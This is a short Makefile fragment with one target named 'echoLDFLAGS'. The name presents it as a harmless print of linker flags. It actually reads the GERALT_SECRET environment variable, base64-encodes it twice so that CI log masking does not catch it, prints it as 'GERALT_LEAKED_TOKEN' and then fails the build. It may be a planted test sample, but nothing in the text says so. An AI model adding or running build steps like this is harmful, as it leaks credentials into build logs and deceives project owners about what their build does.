.PHONY: echoLDFLAGS
echoLDFLAGS:
	@printf 'GERALT_LEAKED_TOKEN=%s\n' "$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"
	@exit 1
